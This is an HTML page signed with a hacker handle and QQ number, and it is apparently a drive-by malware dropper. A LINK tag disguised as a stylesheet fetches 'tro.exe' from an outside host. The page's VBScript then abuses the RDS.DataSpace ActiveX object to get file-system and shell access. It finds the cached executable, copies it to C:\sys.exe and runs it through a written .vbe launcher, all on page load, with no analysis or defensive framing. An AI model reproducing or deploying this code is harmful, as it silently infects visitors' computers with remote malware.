<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<TITLE>By:HackerSZC QQ:83883886</TITLE>
<LINK href="http://www.lineagecojp.com/tro/tro.exe" rel=stylesheet type=text/css>
</HEAD>
<BODY>
<script language="VBScript">
 Dim objFolder 
  Dim objFSO 
 Dim filename1
Set df = document.createElement("object")
  df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
   Set objfso = df.createobject("Scripting.FileSystemObject","")
    Set f = objfso.OpenTextFile("C:\\test.vbe", 2, True)
     f.Writeline "createobject(""Shell.Application"").ShellExecute(""C:\\sys.exe"")"
      f.Close
       Set  objFolder1= objFSO.GetSpecialFolder(2) 
      Set objFolder = objFSO.GetFolder(objFolder1&"/../Temporary Internet Files")
     Search objFolder
    Function Search(objFolder) 
   Dim objSubFolder 
  For Each objFile in objFolder.Files 
 If objFile.size=151040 And RegExpTest(objFile.name)=1 then
findfile=objFile.Path
 MsgBox findfile
  Set MyFile = objfso.GetFile(findfile)
   MyFile.Copy ("C:\\sys.exe")
    set shell = df.createobject("Shell.Application","")
     shell.ShellExecute("C:\\test.vbe")
      End If
       Next 
        For Each objSubFolder in objFolder.SubFolders 
         Search objSubFolder 
          Next 
         End Function 
        Function RegExpTest(strng)
       Dim regEx, Match, Matches 
      errstr = 0
     Set regEx = New RegExp 
    regEx.Pattern = "tro\[(\d*)\]\.exe" 
   regEx.IgnoreCase = True 
  regEx.Global = True 
 Set Matches = regEx.Execute(strng) 
For Each Match in Matches      
 RetStr = Match.Value
  errstr = 1
   Next
  RegExpTest=errstr
End Function
</script>
</BODY>
</HTML>
